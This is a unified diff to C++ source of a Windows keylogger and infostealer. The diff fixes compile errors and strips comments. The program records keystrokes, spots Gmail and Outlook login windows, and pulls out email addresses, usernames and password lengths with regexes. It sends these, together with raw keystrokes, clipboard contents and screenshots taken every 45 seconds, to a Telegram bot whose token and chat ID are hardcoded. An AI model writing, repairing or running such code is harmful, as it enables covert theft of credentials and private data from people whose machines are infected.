@@ -13,6 +13,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "kernel32.lib")
 
 const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
 const wchar_t* CHAT_ID = L"7845441585";
@@ -26,8 +27,39 @@ FILETIME lastScreenshot = {0};
 std::wstring activeWindowTitle;
 
 class ContextAwareDetector {
-private:
+public:  // ← FIXED: Made public
     std::wstring currentContext;
+    
+private:
+    std::wstring detect_email(const std::wstring& text) {
+        std::wregex email_regex(L"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})");
+        std::wsmatch match;
+        if (std::regex_search(text, match, email_regex)) {
+            return match[1].str();
+        }
+        
+        std::wregex user_regex(L"([a-zA-Z0-9._]{6,25})(?=[\\r\\n\\t ]|$)");
+        if (std::regex_search(text, match, user_regex)) {
+            std::wstring user = match[1].str();
+            if (currentContext == L"GMAIL" || wcsstr(activeWindowTitle.c_str(), L"mail")) {
+                return user + L"@gmail.com";
+            }
+            return user;
+        }
+        return L"";
+    }
+    
+    std::wstring detect_password(const std::wstring& text) {
+        std::wregex pass_regex(L"([a-zA-Z0-9!@#$%^&*._-]{8,})(?=[\\r\\n\\t ]|$)");
+        std::wsmatch match;
+        if (std::regex_search(text, match, pass_regex)) {
+            std::wstring pass = match[1].str();
+            std::wstring masked;
+            for (size_t i = 0; i < pass.length(); ++i) masked += L'*';
+            return masked + L"(" + std::to_wstring(pass.length()) + L")";
+        }
+        return L"";
+    }
     
 public:
     void update_context() {
@@ -37,7 +69,6 @@ public:
             GetWindowTextW(foreground, title, 256);
             activeWindowTitle = title;
             
-            // Detect login pages
             if (wcsstr(title, L"gmail") || wcsstr(title, L"Google")) {
                 currentContext = L"GMAIL";
             } else if (wcsstr(title, L"outlook") || wcsstr(title, L"live.com")) {
@@ -68,40 +99,6 @@ public:
         }
         return L"";
     }
-    
-private:
-    std::wstring detect_email(const std::wstring& text) {
-        // Full email
-        std::wregex email_regex(L"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})");
-        std::wsmatch match;
-        if (std::regex_search(text, match, email_regex)) {
-            return match[1].str();
-        }
-        
-        // Username pattern (6-25 chars + enter/tab)
-        std::wregex user_regex(L"([a-zA-Z0-9._]{6,25})(?=[\\r\\n\\t ]|$)");
-        if (std::regex_search(text, match, user_regex)) {
-            std::wstring user = match[1].str();
-            if (currentContext == L"GMAIL" || wcsstr(activeWindowTitle.c_str(), L"mail")) {
-                return user + L"@gmail.com";
-            }
-            return user;
-        }
-        return L"";
-    }
-    
-    std::wstring detect_password(const std::wstring& text) {
-        // 8+ sequential chars (password pattern)
-        std::wregex pass_regex(L"([a-zA-Z0-9!@#$%^&*._-]{8,})(?=[\\r\\n\\t ]|$)");
-        std::wsmatch match;
-        if (std::regex_search(text, match, pass_regex)) {
-            std::wstring pass = match[1].str();
-            std::wstring masked;
-            for (size_t i = 0; i < pass.length(); ++i) masked += L'*';
-            return masked + L"(" + std::to_wstring(pass.length()) + L")";
-        }
-        return L"";
-    }
 };
 
 ContextAwareDetector detector;
@@ -129,7 +126,7 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
 }
 
 bool init_winhttp() {
-    hHttpSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     return hHttpSession != NULL;
 }
@@ -174,7 +171,6 @@ void process_keys() {
     keyBuffer.clear();
     LeaveCriticalSection(&keyLock);
     
-    // CONTEXT-AWARE DETECTION
     std::wstring creds = detector.detect_credentials(data);
     if (!creds.empty()) {
         send_telegram(creds + L"\nWINDOW: " + activeWindowTitle + L"\nKEYS: " + data);
@@ -227,9 +223,8 @@ void capture_screenshot() {
     BITMAPINFOHEADER bi = {sizeof(BITMAPINFOHEADER), cx, -cy, 1, 24, BI_RGB};
     screenshotBuffer.resize((cx * cy * 3) + 54);
     
-    // BMP headers
     DWORD* pdw = (DWORD*)screenshotBuffer.data();
-    pdw[0] = 0x4D42; // 'BM'
+    pdw[0] = 0x4D42;
     pdw[1] = screenshotBuffer.size();
     pdw[2] = 0;
     pdw[3] = 54;
@@ -259,7 +254,8 @@ void send_screenshot() {
                                            WINHTTP_FLAG_SECURE);
     if (hRequest) {
         std::string boundary = "----ChangesBoundary123";
-        std::string content_type = "Content-Type: multipart/form-data; boundary=" + boundary;
+        std::wstring w_content_type = L"Content-Type: multipart/form-data; boundary=";
+        w_content_type += std::wstring(boundary.begin(), boundary.end()).c_str();
         
         std::string body = "--" + boundary + "\r\n" +
                           "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.bmp\"\r\n" +
@@ -267,8 +263,10 @@ void send_screenshot() {
         body.append(screenshotBuffer.begin(), screenshotBuffer.end());
         body += "\r\n--" + boundary + "--\r\n";
         
-        WinHttpSendRequest(hRequest, content_type.c_str(), content_type.length(),
-                          (LPVOID)body.data(), body.length(), body.length(), 0);
+        // ← FIXED: Proper WinHttpSendRequest call
+        WinHttpSendRequest(hRequest, w_content_type.c_str(), -1L,
+                          (LPVOID)body.data(), (DWORD)body.length(), 
+                          (DWORD)body.length(), 0);
         WinHttpReceiveResponse(hRequest, NULL);
         WinHttpCloseHandle(hRequest);
     }
@@ -314,17 +312,14 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
         
         SYSTEMTIME st;
         while (running) {
-            // Process keys
             process_keys();
             
-            // Clipboard
             if (TryEnterCriticalSection(&clipLock) && !clipBuffer.empty()) {
                 send_telegram(clipBuffer);
                 clipBuffer.clear();
                 LeaveCriticalSection(&clipLock);
             }
             
-            // Screenshot every 45s
             GetSystemTime(&st);
             FILETIME now;
             SystemTimeToFileTime(&st, &now);
@@ -338,7 +333,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
                 lastScreenshot = now;
             }
             
-            Sleep(75); // 75ms polling
+            Sleep(75);
         }
     }
     
